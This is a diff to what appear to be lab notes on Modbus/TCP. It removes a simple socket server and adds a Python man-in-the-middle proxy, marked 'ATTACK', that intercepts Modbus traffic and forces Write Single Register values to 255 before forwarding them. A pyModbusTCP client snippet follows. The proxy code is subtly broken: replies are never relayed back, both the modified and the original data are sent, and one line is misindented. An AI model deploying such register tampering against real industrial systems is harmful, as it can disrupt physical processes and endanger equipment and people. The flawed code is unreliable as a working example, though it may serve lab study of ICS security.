@@ -140,40 +140,6 @@ def main():
 if __name__ == '__main__':
     main()
 ```
-explaining parts of code:
-
-import socket
-from _thread import start_new_thread
-import threading
-
-lock = threading.Lock()
-
-def handle_client(c):
-    while True:
-        data = c.recv(1024)
-        if not data:
-            print('Bye')
-            lock.release()
-            break
-        c.send(data[::-1])
-    c.close()
-
-def main():
-    host = ''
-    port = 12345
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind((host, port))
-    s.listen(5)
-    print("Server running on port", port)
-
-    while True:
-        c, addr = s.accept()
-        lock.acquire()
-        print('Connected to:', addr[0], ':', addr[1])
-        start_new_thread(handle_client, (c,))
-
-if __name__ == '__main__':
-    main()
 
 
 
@@ -242,8 +208,68 @@ except KeyboardInterrupt:
     print("\nShutdown server ...")
     server.stop()
     print("Server is offline")
-
 ```
+```
+import socket
+import threading
+# Configuration
+LOCAL_PORT = 9999        # The port the Client connects to
+TARGET_IP = "127.0.0.1"  # The real Server IP
+TARGET_PORT = 12345      # The real Server Port
+
+def handle_client(client_socket):
+    # Connect to the real Modbus Server
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.connect((TARGET_IP, TARGET_PORT))
+
+    # Thread to move data from Server back to Client
+    def server_to_client():
+        while True:
+            data = server_socket.recv(4096)
+            if not data: break
+    threading.Thread(target=server_to_client, daemon=True).start()
+
+    # Main loop to move data from Client to Server
+    while True:
+        data = client_socket.recv(4096)
+        if not data: break
+
+        modified_data = bytearray(data)
+
+        # Check for Function Code 06 (Write Single Register)
+        if len(modified_data) == 12 and modified_data[7] == 0x06:
+            # Force the value to 255 (0x00ff)
+            modified_data[10:12] = b'\x00\xff' 
+            print(f"[*] ATTACK: Modified FC06 value to 255")
+
+        print(f"[*] Intercepted Client Data: {data.hex()}")
+
+        # CRITICAL CHANGE: Send the MODIFIED data, not the original data
+        server_socket.send(modified_data)
+        # MITM Modification Example:
+        # If we see a specific pattern, we could replace it here.
+        server_socket.send(data)
+   client_socket.close()
+    server_socket.close()
+
+def start_proxy():
+    proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    proxy.bind(("0.0.0.0", LOCAL_PORT))
+    proxy.listen(5)
+    print(f"[*] MITM Proxy listening on port {LOCAL_PORT}...")
+
+    while True:
+        client_sock, addr = proxy.accept()
+        print(f"[*] Connection from {addr}")
+        threading.Thread(target=handle_client, args=(client_sock,)).start()
+
+if __name__ == "__main__":
+    start_proxy()
+
+
+
+
+
 # TCP MODBUS CLIENT
 ```                           
 from pyModbusTCP.client import ModbusClient
@@ -251,6 +277,7 @@ client= ModbusClient(host="127.0.0.1",port=12345,unit_id=1, auto_open=True)
 regs = client.read_holding_registers(0, 2)
 regs1 = client.read_holding_registers(10,2)
 if regs:
+
     print(regs)
 else:
     print("read error")
@@ -265,3 +292,4 @@ if regs1:
 else:
         print("read error")
 ```
+UDP: https://dl.acm.org/doi/pdf/10.1145/1409908.1409911
